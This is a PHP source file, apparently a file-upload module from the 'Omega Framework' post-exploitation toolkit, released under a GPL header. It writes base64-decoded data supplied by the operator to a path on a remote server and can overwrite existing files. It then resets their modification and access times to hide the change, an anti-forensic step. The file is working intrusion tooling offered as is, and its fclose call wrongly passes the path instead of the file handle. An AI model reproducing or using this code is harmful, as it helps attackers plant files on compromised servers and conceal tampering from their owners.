<?

//            ---------------------------------------------------
//                              Omega Framework                                
//            ---------------------------------------------------
//                  Copyright (C) <2020>  <Entynetproject>       
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

$target = $OMEGA['TARGET'];

// if target is a directory, append $OMEGA['NAME'] to it.
if (@is_dir($target))
{
    if (substr($target, -1) != $OMEGA['PATH_SEP'])
        $target .= $OMEGA['PATH_SEP'];
    $target .= $OMEGA['NAME'];
}

// if file already exists, some checks are mandatory
if (@file_exists($target))
{
    if (!@is_file($target))
        return error("%s: Remote path is not a file", $target);
    if (!$OMEGA['FORCE'])
        return array("KO", $target);
    $old_mtime = @filemtime($target);
    $old_atime = @fileatime($target);
}

// try to write file contents
if (($file = @fopen($target, 'w')) === False)
{
    if (@is_dir(dirname($target)))
        return error("%s: Write permission denied", $target);
    return error("%s: No such file or directory", $target);
}
$data = base64_decode($OMEGA['DATA']);
if (@fwrite($file, $data) === False)
    return error("%s: Could not write to file", $target);

@fclose($target);
if (isset($old_mtime))
    @touch($target, $old_mtime, $old_atime);

return array("OK", $target);

?>
